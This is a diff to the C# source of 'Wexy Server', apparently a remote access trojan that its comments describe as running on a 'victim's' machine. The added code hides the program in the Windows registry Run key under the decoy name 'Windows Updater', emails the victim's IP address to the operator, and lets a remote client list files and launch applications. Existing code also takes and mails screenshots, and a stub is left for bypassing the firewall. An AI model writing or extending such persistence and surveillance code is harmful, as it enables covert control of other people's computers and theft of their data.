@@ -17,23 +17,20 @@ namespace Wexy_Server
         //[DllImport("user32.dll")]
         //public static extern bool FreeConsole(); //hides the console from view.
 
-        //TODO - > the server hides itself inside the registry and is launched on Windows startup.
-        //public static void AddToStartup()
-
         //TODO - > the server must be able to connect to the internet without being blocked by the firewall
         public static void BypassFirewall()
         {
 
         }
-
-        //TODO - > the server tells the client he is alive and sends him the victims IP.
-        public static void NotifyClient()
+        
+        //TODO - > returns the computer's IP adress.
+        public static string getIp()
         {
-
+            string ip = "";
+            return ip;
         }
 
-     
-
+        
         public static void ReceiveCommands()
         {
             //Infinite loop 
@@ -60,7 +57,6 @@ namespace Wexy_Server
                     //Get the actual command.
                     command = CommandArray[0];
 
-
                     switch (command)
                     {
                         case "msg":
@@ -81,15 +77,45 @@ namespace Wexy_Server
                             break;
 
                         case "pcname":
-                            //NOT FINISHED
+                            //Get the pc name
                             SendPCName();
                             break;
 
                         case "showfiles":
-                            //TODO
-                            string path = CommandArray[1];
-                            //string path = @"C:/users/"+Environment.UserName+"/Desktop/";
-                            ListFiles(path);
+                            //Show files in specified folder
+                            //string path = CommandArray[1];
+                            
+                            /*switch (dir)
+                            {
+                                case "C" :
+                                    string c = @"C:/";
+                                     ListFiles(c);
+                                    break;
+                                case "desktop" :
+                                    string d = @"C:/users/" + Environment.UserName + "/Desktop/";
+                                    ListFiles(d);
+                                    break;
+                            }*/
+
+                            string dir = CommandArray[1];
+                            if (dir == "C")
+                            {
+                                dir = @"C:/";
+                                ListFiles(dir);
+                                break;
+                            }
+                                
+                            else
+                            {
+                                dir = @"C:/users/" + Environment.UserName + "/Desktop/";
+                                ListFiles(dir);
+                                break;
+                            }
+
+                        case "openApp":
+                            //Open specified application
+                            string appName = CommandArray[1];
+                            openApp(appName);
                             break;
                     }
                 }
@@ -102,28 +128,75 @@ namespace Wexy_Server
 
 
         #region Commands
-        // - NOT OK - 
-        public static void ListFiles(string location)
+
+        //- ALMOST OK - [NOT TESTED YET] the server hides itself inside the registry and is launched on Windows startup.
+        public static void AddToStartup()
         {
-            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(@location);
-            foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
+            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser
+                 .OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
             {
-                try
-                {
-                    byte[] Packet = Encoding.ASCII.GetBytes(f.Name);
-                    Writer.Write(Packet, 0, Packet.Length);
-                    Writer.Flush();
-                }
-                catch
-                {
-                    Console.WriteLine("client disconnected from server!");
-                    Console.ReadKey();
-                    Writer.Close();
-                }
-            } 
+                //We set the key name to Windows Updater ,so if the victim browses throught the registry , he won't notice anything malicious.
+                key.SetValue("Windows Updater", "\"" + Application.ExecutablePath + "\"");
+            }
         }
 
-        // - ALMOST OK -
+        //- ALMOST OK - [NOT TESTED YET] the server tells the client he is alive and sends him the victim's IP. 
+        //To be called on main.
+        public static void NotifyClient()
+        {
+            try
+            {
+                //Configure the stmp client
+                SmtpClient client = new SmtpClient("smtp.live.com");
+                client.Port = 587;
+                client.EnableSsl = true;
+                client.Timeout = 100000;
+                client.DeliveryMethod = SmtpDeliveryMethod.Network;
+                client.Credentials = new System.Net.NetworkCredential("your_mail_sender", "your_password");
+
+                //Configure the mail to send
+                Attachment objAttachment = new Attachment(@"path_to_file_you_wanna");
+                MailMessage msg = new MailMessage();
+                msg.To.Add("your_mail_receiver");
+                msg.From = new MailAddress("your_mail_sender");
+                msg.Attachments.Add(objAttachment);
+                msg.Subject = "Wexy server has started ! ";
+                msg.Body = "Wexy server is alive at -> " + getIp();
+
+                client.Send(msg);
+            }
+            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
+            {
+                Environment.Exit(0);
+            }
+        }
+
+        // - ALMOST OK - 
+        public static void openApp(string applicationName)
+        {
+            System.Diagnostics.Process app = new System.Diagnostics.Process();
+            app.StartInfo.FileName = applicationName;
+            app.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
+            app.Start();
+        }
+
+        // - NOT OK - [Ramdom blank lines appear..]
+        public static void ListFiles(string location)
+        {
+            string allFiles = "";
+            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(location);
+            
+            foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
+            {
+                allFiles = allFiles +"\n"+f.Name;
+            }
+
+            byte[] Packet = Encoding.ASCII.GetBytes(allFiles);
+            Writer.Write(Packet, 0, Packet.Length);
+            Writer.Flush();
+        }
+
+        // - ALMOST OK - [Multiple blank lines generated after the Computer name is received.]
         public static void SendPCName()
         {
             try
@@ -147,8 +220,7 @@ namespace Wexy_Server
             }
         }
 
-
-        // -  OK - 
+        // - OK - 
         public static void TakeScreenshot()
         {
             Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -183,12 +255,9 @@ namespace Wexy_Server
 
                 client.Send(msg);
             }
-            catch
+            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
             {
-                Console.WriteLine("An error occured when trying to send the mail");
-                Console.ReadKey();
                 Environment.Exit(0);
-                //throw ex;
             }
         }
 
@@ -202,8 +271,7 @@ namespace Wexy_Server
             IE.Start();
         }
 
-
-        //- OK - 
+        // - OK - 
         public static void DisplayMessage(string message)
         {
             System.Windows.Forms.MessageBox.Show(message.Trim('\0'));
@@ -224,6 +292,7 @@ namespace Wexy_Server
 
             //Wait for client to connect, then make a TcpClient to accept the connection
             TcpClient connection = l.AcceptTcpClient();
+            
 
             //Get Connection's stream
             Receiver = connection.GetStream();
